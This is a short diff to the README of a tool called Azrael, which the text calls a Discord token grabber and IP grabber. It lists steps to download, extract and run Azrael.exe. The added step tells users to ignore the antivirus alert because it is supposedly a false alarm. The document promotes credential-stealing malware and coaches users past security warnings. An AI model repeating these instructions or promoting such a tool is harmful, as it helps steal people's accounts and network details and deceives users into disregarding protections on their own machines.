@@ -89,6 +89,7 @@ This is a brand new discord token grabber and ip grabber made for those who cant
 3. [Download Azrael](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Azrael** folder and double click *Azrael.exe* file.
+6. It will show up as a virus but ignore it due to it being a false alarm.
 
 
 ## Support the Project
